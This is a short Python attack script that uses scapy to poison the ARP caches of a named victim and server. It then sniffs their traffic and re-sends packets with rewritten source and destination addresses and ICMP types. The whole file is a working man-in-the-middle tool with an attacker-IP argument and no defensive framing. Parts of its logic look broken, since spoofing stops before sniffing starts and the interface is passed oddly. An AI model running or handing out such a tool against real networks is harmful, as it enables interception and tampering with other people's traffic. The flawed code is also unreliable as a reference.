import sys
import time
from scapy.layers.l2 import getmacbyip, ARP
from scapy.sendrecv import send, sniff
from scapy.layers.inet import IP, ICMP


def arp_spoof(victim_ip, server_ip):
    victim_mac = getmacbyip(victim_ip)
    server_mac = getmacbyip(server_ip)

    victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip)
    server_packet = ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip)

    send(victim_packet, verbose=False)
    send(server_packet, verbose=False)


def forward_packets(packet, victim_ip, server_ip, attacker_ip):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == server_ip:
            packet[IP].src = attacker_ip

            if packet.haslayer(ICMP):
                packet[ICMP].type = 0

            send(packet)

        elif packet[IP].src == server_ip and packet[IP].dst == victim_ip:
            packet[IP].dst = attacker_ip

            if packet.haslayer(ICMP):
                packet[ICMP].type = 8

            send(packet)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: " + sys.argv[0] + " <victim_ip> <server_ip> <attacker_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    server_ip = sys.argv[2]
    attacker_ip = sys.argv[3]

    iface = "eth0"

    print("[+] Starting ARP spoofing...")
    while True:
        try:
            arp_spoof(victim_ip, server_ip)
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n[+] Stopping ARP spoofing...")
            break

    print("[+] Starting packet sniffing...")
    sniff(
        iface,
        prn=lambda packet: forward_packets(packet, victim_ip, server_ip, attacker_ip),
    )
